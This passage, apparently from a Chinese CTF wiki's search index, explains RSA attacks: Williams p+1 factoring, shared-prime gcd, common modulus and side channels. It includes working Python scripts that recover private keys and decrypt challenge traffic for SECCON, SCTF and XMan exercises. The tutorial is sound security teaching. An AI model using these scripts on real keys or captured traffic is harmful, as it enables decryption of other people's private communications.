= s\\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)-1 p = s\\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)-1 \u5f53 s s \u662f\u7d20\u6570\uff0c\u4e14 B_1<s\\le B_2 B_1<s\\le B_2 \uff0c\u6709 p\\mid(a_m^s-1, N)\uff0c p\\mid(a_m^s-1, N)\uff0c \u5b9a\u4e49 s_j s_j \u548c 2d_j 2d_j 2d_j = s_j+1-s_j 2d_j = s_j+1-s_j \u5982\u679c (\\Delta/p) = -1 (\\Delta/p) = -1 \u4e14 p\\nmid P_m-2 p\\nmid P_m-2 \uff0c\u5219\u6839\u636e \u516c\u5f0f2.7 \u548c \u516c\u5f0f3.1 \u6709 p\\mid(U_s(P_m), N) p\\mid(U_s(P_m), N) \u3002 \u4ee4 U[n] \\equiv U_n(P_m), V[n]\\equiv V_n(P_m)\\pmod{N} U[n] \\equiv U_n(P_m), V[n]\\equiv V_n(P_m)\\pmod{N} \uff0c\u8ba1\u7b97 U[2d_j-1], U[2d_j], U[2d_j+1] U[2d_j-1], U[2d_j], U[2d_j+1] \u901a\u8fc7 U[0] = 0, U[1] = 1, U[n+1] = P_mU[n] - U[n-1] U[0] = 0, U[1] = 1, U[n+1] = P_mU[n] - U[n-1] \u8ba1\u7b97 T[s_i] \\equiv \\Delta U_{s_i}(P_m) = \\Delta U_{s_iR}(P_0)/U_R(P_0)\\pmod{N} T[s_i] \\equiv \\Delta U_{s_i}(P_m) = \\Delta U_{s_iR}(P_0)/U_R(P_0)\\pmod{N} \u901a\u8fc7 \u516c\u5f0f2.6 \uff0c \u516c\u5f0f2.7 \u548c \u516c\u5f0f3.1 \u6709 \\begin{cases} T[s_1]&\\equiv P_mV[s_1]-2V[s_1-1]\\\\ T[s_1-1]&\\equiv 2V[s_1]-P_mV[s_1-1]\\pmod{N} \\end{cases} \\begin{cases} T[s_1]&\\equiv P_mV[s_1]-2V[s_1-1]\\\\ T[s_1-1]&\\equiv 2V[s_1]-P_mV[s_1-1]\\pmod{N} \\end{cases} \u5373 \\begin{cases} T[s_{i+1}]&\\equiv T[s_i]U[2d_i+1]-T[s_i-1]U[2d_i]\\\\ T[s_{i+1}-1]&\\equiv T[s_i]U[2d_i]-T[s_i-1]U[2d_i-1]\\pmod{N} \\end{cases} \\begin{cases} T[s_{i+1}]&\\equiv T[s_i]U[2d_i+1]-T[s_i-1]U[2d_i]\\\\ T[s_{i+1}-1]&\\equiv T[s_i]U[2d_i]-T[s_i-1]U[2d_i-1]\\pmod{N} \\end{cases} \u8ba1\u7b97 T[s_i], i=1,2,3\\dots T[s_i], i=1,2,3\\dots \uff0c\u7136\u540e\u8ba1\u7b97 H_t = (\\prod_{i=0}^c{T[s_{i+t}], N}) H_t = (\\prod_{i=0}^c{T[s_{i+t}], N}) \u5176\u4e2d t = 1, c+1, 2c+1, \\dots, c[B_2/c]+1 t = 1, c+1, 2c+1, \\dots, c[B_2/c]+1 \uff0c\u6211\u4eec\u6709 p\\mid H_i p\\mid H_i \u5f53 (\\Delta/p)=-1 (\\Delta/p)=-1 python\u4ee3\u7801\u5b9e\u73b0 def mlucas ( v , a , n ): \"\"\" Helper function for williams_pp1(). Multiplies along a Lucas sequence modulo n. \"\"\" v1 , v2 = v , ( v ** 2 - 2 ) % n for bit in bin ( a )[ 3 :]: v1 , v2 = (( v1 ** 2 - 2 ) % n , ( v1 * v2 - v ) % n ) if bit == \"0\" else (( v1 * v2 - v ) % n , ( v2 ** 2 - 2 ) % n ) return v1 for v in count ( 1 ): for p in primegen (): e = ilog ( isqrt ( n ), p ) if e == 0 : break for _ in xrange ( e ): v = mlucas ( v , p , n ) g = gcd ( v - 2 , n ) if 1 < g < n : return g # g|n if g == n : break","title":"p + 1 \u5149\u6ed1"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#2017-seccon-very-smooth","text":"\u8be5\u7a0b\u5e8f\u7ed9\u4e86\u4e00\u4e2a HTTPS \u52a0\u5bc6\u7684\u6d41\u91cf\u5305\uff0c\u9996\u5148\u4ece\u5176\u4e2d\u62ff\u5230\u8bc1\u4e66 \u279c 2017_SECCON_verysmooth git: ( master ) binwalk -e s.pcap DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 2292 0x8F4 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 4038 0xFC6 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 5541 0x15A5 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 \u279c 2017_SECCON_verysmooth git: ( master ) ls s.pcap _s.pcap.extracted very_smooth.zip \u8fd9\u91cc\u5206\u522b\u67e5\u770b\u4e09\u4e2a\u8bc1\u4e66\uff0c\u4e09\u4e2a\u6a21\u6570\u90fd\u4e00\u6837\uff0c\u8fd9\u91cc\u53ea\u7ed9\u4e00\u4e2a\u4f8b\u5b50 \u279c _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt -pubkey -text -modulus -noout -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy 8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj DUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl yioxCqbXYIMxGO4NcQIDAQAB -----END PUBLIC KEY----- Certificate: Data: Version: 1 (0x0) Serial Number: 11640506567126718943 (0xa18b630c7b3099df) Signature Algorithm: sha256WithRSAEncryption Issuer: C=JP, ST=Kawasaki, O=SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C=JP, ST=Kawasaki, O=SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39 Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71 \u53ef\u4ee5\u770b\u51fa\u6a21\u6570\u53ea\u6709 1024 \u6bd4\u7279\u3002\u800c\u4e14\uff0c\u6839\u636e\u9898\u76ee\u540d very smooth\uff0c\u5e94\u8be5\u662f\u5176\u4e2d\u4e00\u4e2a\u56e0\u5b50\u6bd4\u8f83 smooth\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528 primefac \u5206\u522b\u5c1d\u8bd5 Pollard's p \u2212 1 \u4e0e Williams's p + 1 \u7b97\u6cd5\uff0c\u5982\u4e0b \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs -m = p+1 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 : p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 Z309 = P155 x P155 = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 \u53ef\u4ee5\u53d1\u73b0\u5f53\u4f7f\u7528 Williams's p + 1 \u7b97\u6cd5\u65f6\uff0c\u5c31\u76f4\u63a5\u5206\u89e3\u51fa\u6765\u4e86\u3002\u6309\u9053\u7406\u8fd9\u4e2a\u56e0\u5b50\u662f p-1 \u4f3c\u4e4e\u66f4\u5149\u6ed1\uff0c\u4f46\u662f\u5374\u5e76\u4e0d\u80fd\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u5206\u89e3\uff0c\u8fd9\u91cc\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5 \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 : 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 Z154 = P1 x P1 x P2 x P3 x P6 x P142 = 2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 : 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 Z154 = P1^185 x P1^62 x P1^97 = 2 ^185 x 3 ^62 x 5 ^97 \u53ef\u4ee5\u770b\u51fa\uff0c\u5bf9\u4e8e p-1 \u786e\u5b9e\u6709\u5f88\u591a\u5c0f\u56e0\u5b50\uff0c\u4f46\u662f\u4e2a\u6570\u592a\u591a\uff0c\u8fd9\u5c31\u4f1a\u4f7f\u5f97\u8fdb\u884c\u679a\u4e3e\u7684\u65f6\u5019\u51fa\u73b0\u6307\u6570\u7206\u70b8\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u6ca1\u6709\u5206\u89e3\u51fa\u6765\u3002 \u8fdb\u800c\u6839\u636e\u5206\u89e3\u51fa\u6765\u7684\u6570\u6784\u9020\u79c1\u94a5 from Crypto.PublicKey import RSA import gmpy2 def main (): n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 L p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 L q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 L e = 65537 L priv = RSA . construct (( n , e , long ( gmpy2 . invert ( e , ( p - 1 ) * ( q - 1 ))))) open ( 'private.pem' , 'w' ) . write ( priv . exportKey ( 'PEM' )) main () \u6700\u540e\uff0c\u5c06\u79c1\u94a5\u5bfc\u5165\u5230 wireshark \u4e2d\u5373\u53ef\u5f97\u5230\u660e\u6587\uff08Edit -> Preferences -> Protocols -> SSL -> RSA Key List\uff09\u3002 < html > < head >< title > Very smooth </ title ></ head > < body > < h1 > Answer: One of these primes is very smooth. </ h1 > </ body > </ html >","title":"2017 SECCON very smooth"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_4","text":"\u5173\u4e8e\u66f4\u591a\u7684\u4e00\u4e9b\u5206\u89e3\u6a21\u6570 N \u7684\u65b9\u6cd5\u53ef\u4ee5\u53c2\u8003 https://en.wikipedia.org/wiki/Integer_factorization \u3002","title":"\u6269\u5c55"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_5","text":"","title":"\u6a21\u4e0d\u4e92\u7d20"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_6","text":"\u5f53\u5b58\u5728\u4e24\u4e2a\u516c\u94a5\u7684 N \u4e0d\u4e92\u7d20\u65f6\uff0c\u6211\u4eec\u663e\u7136\u53ef\u4ee5\u76f4\u63a5\u5bf9\u8fd9\u4e24\u4e2a\u6570\u6c42\u6700\u5927\u516c\u56e0\u6570\uff0c\u7136\u540e\u76f4\u63a5\u83b7\u5f97 p\uff0cq\uff0c\u8fdb\u800c\u83b7\u5f97\u76f8\u5e94\u7684\u79c1\u94a5\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#sctf-rsa2","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF rsa2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u76f4\u63a5\u6253\u5f00 pcap \u5305\uff0c\u53d1\u73b0\u6709\u4e00\u5806\u7684\u6d88\u606f\uff0c\u5305\u542b N \u548c e\uff0c\u7136\u540e\u8bd5\u4e86\u8bd5\u4e0d\u540c\u7684 N \u662f\u5426\u4e92\u7d20\uff0c\u6211\u8bd5\u4e86\u524d\u4e24\u4e2a import gmpy2 n1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031 n2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943 print gmpy2 . gcd ( n1 , n2 ) \u7ed3\u679c\u53d1\u73b0\u7adf\u7136\u4e0d\u4e92\u7d20\u3002 \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py 122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137 \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6765\u89e3\u5bc6\u4e86\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7b2c\u4e00\u5bf9\u516c\u94a5\u5bc6\u7801\u3002\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode n1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031 n2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943 p1 = gmpy2 . gcd ( n1 , n2 ) q1 = n1 / p1 e = 65537 phin = ( p1 - 1 ) * ( q1 - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7 plain = gmpy2 . powmod ( cipher , d , n1 ) plain = hex ( plain )[ 2 :] if len ( plain ) % 2 != 0 : plain = '0' + plain print plain . decode ( 'hex' ) \u6700\u540e\u89e3\u5bc6\u5982\u4e0b \u279c scaf-rsa2 git: ( master ) \u2717 python exp.py sH1R3_PRlME_1N_rsA_iS_4ulnEra5le \u89e3\u538b\u538b\u7f29\u5305\u5373\u53ef\u3002","title":"SCTF RSA2"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_7","text":"","title":"\u5171\u6a21\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_8","text":"\u5f53\u4e24\u4e2a\u7528\u6237\u4f7f\u7528\u76f8\u540c\u7684\u6a21\u6570 N\u3001\u4e0d\u540c\u7684\u79c1\u94a5\u65f6\uff0c\u52a0\u5bc6\u540c\u4e00\u660e\u6587\u6d88\u606f\u65f6\u5373\u5b58\u5728\u5171\u6a21\u653b\u51fb\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_9","text":"\u8bbe\u4e24\u4e2a\u7528\u6237\u7684\u516c\u94a5\u5206\u522b\u4e3a e_1 e_1 \u548c e_2 e_2 \uff0c\u4e14\u4e24\u8005\u4e92\u8d28\u3002\u660e\u6587\u6d88\u606f\u4e3a m m \uff0c\u5bc6\u6587\u5206\u522b\u4e3a\uff1a c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N \u5f53\u653b\u51fb\u8005\u622a\u83b7 c_1 c_1 \u548c c_2 c_2 \u540e\uff0c\u5c31\u53ef\u4ee5\u6062\u590d\u51fa\u660e\u6587\u3002\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u51fa re_1+se_2=1\\bmod n re_1+se_2=1\\bmod n \u7684\u4e24\u4e2a\u6574\u6570 r r \u548c s s \uff0c\u7531\u6b64\u53ef\u5f97\uff1a \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*} \\begin{align*} c_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &\\equiv m\\bmod n \\end{align*}","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#xman","text":"\u9898\u76ee\u63cf\u8ff0\uff1a {6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773} {6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839} message1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349 message2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535 \u9898\u76ee\u6765\u6e90\uff1aXMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60 \u53ef\u4ee5\u770b\u51fa\u4e24\u4e2a\u516c\u94a5\u7684 N \u662f\u4e00\u6837\u7684\uff0c\u5e76\u4e14\u4e24\u8005\u7684 e \u4e92\u7d20\u3002\u5199\u4e00\u4e2a\u811a\u672c\u8dd1\u4e00\u4e0b\uff1a import gmpy2 n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249 e1 = 773 e2 = 839 message1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349 message2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535 # s & t gcd , s , t = gmpy2 . gcdext ( e1 , e2 ) if s < 0 : s = - s message1 = gmpy2 . invert ( message1 , n ) if t < 0 : t = - t message2 = gmpy2 . invert ( message2 , n ) plain = gmpy2 . powmod ( message1 , s , n ) * gmpy2 . powmod ( message2 , t , n ) % n print plain \u5f97\u5230 \u279c Xman-1-class-exercise git: ( master ) \u2717 python exp.py 1021089710312311910410111011910111610410511010710511610511511211111511510598108101125 \u8fd9\u65f6\u5019\u9700\u8981\u8003\u8651\u5f53\u65f6\u660e\u6587\u662f\u5982\u4f55\u8f6c\u5316\u4e3a\u8fd9\u4e2a\u6570\u5b57\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u662f 16 \u8fdb\u5236\u8f6c\u6362\uff0cASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u6216\u8005 Base64 \u89e3\u5bc6\u3002\u8fd9\u4e2a\u5e94\u8be5\u662f ASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u8fdb\u800c\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u4ee3\u7801\u5f97\u5230 flag i = 0 flag = \"\" plain = str ( plain ) while i < len ( plain ): if plain [ i ] == '1' : flag += chr ( int ( plain [ i : i + 3 ])) i += 3 else : flag += chr ( int ( plain [ i : i + 2 ])) i += 2 print flag \u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f7f\u7528 1 \u6765\u5224\u65ad\u662f\u5426\u4e3a\u4e09\u4f4d\u957f\u5ea6\uff0c\u662f\u56e0\u4e3a flag \u4e00\u822c\u90fd\u662f\u660e\u6587\u5b57\u7b26\uff0c\u800c 1 \u5f00\u5934\u7684\u957f\u5ea6\u4e3a 1 \u6216\u8005 2 \u7684\u6570\u5b57\uff0c\u4e00\u822c\u90fd\u662f\u4e0d\u53ef\u89c1\u5b57\u7b26\u3002 flag \u279c Xman-1-class-exercise git: ( master ) \u2717 python exp.py flag { whenwethinkitispossible }","title":"XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_10","text":"Jarvis OJ very hard RSA","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_pkcs_attack/","text":"Bleichenbacher's attack \u00b6 PKCS 1.5 \u6807\u51c6\u4e2d\u53ef\u4ee5\u4f2a\u9020 RSA \u7b7e\u540d\u200b Warning \u5f85\u8865\u5145\u3002 http://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html","title":"Bleichenbacher's attack"},{"location":"crypto/asymmetric/rsa/rsa_pkcs_attack/#bleichenbachers-attack","text":"PKCS 1.5 \u6807\u51c6\u4e2d\u53ef\u4ee5\u4f2a\u9020 RSA \u7b7e\u540d\u200b Warning \u5f85\u8865\u5145\u3002 http://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html","title":"Bleichenbacher's attack"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/","text":"RSA \u4fa7\u4fe1\u9053\u653b\u51fb \u00b6 \u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08\u4fa7\u4fe1\u9053\u653b\u51fb\uff09\u662f\u4e00\u79cd\u80fd\u591f\u4ece\u5bc6\u7801\u8bbe\u5907\u4e2d\u83b7\u53d6\u79d8\u5bc6\u4fe1\u606f\u7684\u5bc6\u7801\u653b\u51fb\u65b9\u6cd5\uff0e\u4e0e\u5176 \u4ed6\u653b\u51fb\u65b9\u6cd5\u4e0d\u540c\uff1a\u8fd9\u79cd\u653b\u51fb\u5229\u7528\u7684\u662f\u5bc6\u7801\u8bbe\u5907\u7684\u80fd\u91cf\u6d88\u8017\u7279\u5f81\uff0c\u800c\u975e\u5bc6\u7801\u7b97\u6cd5\u7684\u6570\u5b66\u7279\u6027\uff0e\u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u4e00\u79cd\u975e\u5165\u4fb5\u5f0f\u653b\u51fb\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u65b9\u4fbf\u5730\u8d2d\u4e70\u5b9e\u65bd\u653b\u51fb\u6240\u9700\u8981\u7684\u8bbe\u5907\uff1a\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u5bf9\u667a\u80fd\u5361\u4e4b\u7c7b\u7684\u5bc6\u7801\u8bbe\u5907\u7684\u5b89\u5168\u6027\u9020\u6210\u4e86\u4e25\u91cd\u5a01\u80c1\u3002 \u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u5b89\u5168\u9886\u57df\u5185\u975e\u5e38\u91cd\u8981\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u6211\u4eec\u53ea\u5728\u8fd9\u91cc\u7b80\u5355\u8ba8\u8bba\u4e0b\u3002 \u80fd\u91cf\u5206\u6790\u653b\u51fb\u5206\u4e3a\uff1a - \u7b80\u5355\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08SPA\uff09\uff0c\u5373\u5bf9\u80fd\u91cf\u8ff9\u8fdb\u884c\u76f4\u89c2\u5206\u6790\uff0c\u8089\u773c\u770b\u5373\u53ef\u3002 - \u5dee\u5206\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08DPA\uff09\uff0c\u57fa\u4e8e\u80fd\u91cf\u8ff9\u4e4b\u95f4\u7684\u76f8\u5173\u7cfb\u6570\u8fdb\u884c\u5206\u6790\u3002 \u653b\u51fb\u6761\u4ef6 \u00b6 \u653b\u51fb\u8005\u53ef\u83b7\u53d6\u4e0e\u52a0\u89e3\u5bc6\u76f8\u5173\u7684\u4fa7\u4fe1\u9053\u4fe1\u606f\uff0c\u4f8b\u5982\u80fd\u91cf\u6d88\u8017\u3001\u8fd0\u7b97\u65f6\u95f4\u3001\u7535\u78c1\u8f90\u5c04\u7b49\u7b49\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 HITB 2017 \u7684 Hack in the card I \u4f5c\u4e3a\u4f8b\u5b50\u3002 \u9898\u76ee\u7ed9\u51fa\u4e86\u516c\u94a5\u6587\u4ef6 publickey.pem \uff0c\u5bc6\u6587\uff0c\u6d4b\u91cf\u667a\u80fd\u5361\u529f\u7387\u7684\u7535\u8def\u56fe\uff0c\u548c \u89e3\u5bc6 \u8fc7\u7a0b\u4e2d\u667a\u80fd\u5361\u6d88\u8017\u7684\u529f\u7387\u53d8\u5316\uff08\u901a\u8fc7\u5728\u7ebf\u7f51\u7ad9\u7ed9\u51fa trace \uff09\u3002 \u5bc6\u6587\uff1a 